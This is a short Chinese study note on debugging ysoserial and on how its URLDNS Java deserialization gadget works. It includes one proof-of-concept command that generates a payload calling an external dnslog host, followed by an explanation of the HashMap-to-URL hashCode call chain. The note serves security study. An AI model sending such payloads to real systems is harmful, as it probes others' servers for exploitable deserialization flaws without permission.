# ysoserial如何调试
对java和ysoserial的调试文章: https://t.zsxq.com/ubQRvjq  
从如下插件可看出主文件在ysoserial.GeneratePayload
```text
<plugin>
	<artifactId>maven-assembly-plugin</artifactId>
	<configuration>
		<finalName>${project.artifactId}-${project.version}-all</finalName>
		<appendAssemblyId>false</appendAssemblyId>
		<archive>
			<manifest>
				<mainClass>ysoserial.GeneratePayload</mainClass>
			</manifest>
		</archive>
          <descriptor>assembly.xml</descriptor>
      </configuration>
	<executions>
		<execution>
			<id>make-assembly</id>
			<phase>package</phase>
			<goals>
				<goal>single</goal>
			</goals>
		</execution>
	</executions>
</plugin>
```

# URLDNS
ysoserial文章: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/  
回显使用的burpsuite Collaborator: https://blog.csdn.net/fageweiketang/article/details/89073662  
## poc
```bash
java -jar ysoserial.jar URLDNS http://m2p55h.dnslog.cn > ysoserial/urldns.ser
```

## 分析
URL的equals()和hashCode()会触发dns请求域名相应的ip地址  
https://docs.oracle.com/javase/7/docs/api/java/net/URL.html#equals(java.lang.Object)  

```text
发送网络请求的调用链条
HashMap#readObject
HashMap#hash
URL#hashCode
URLStreamHandler#hashCode
URLStreamHandler#getHostAddress (根据主机名获取其ip地址 相当于网络请求)
```
就相当于, 我们反序列化了一个数据, 结果却向某个网站发起了请求, 这个就是反序列化漏洞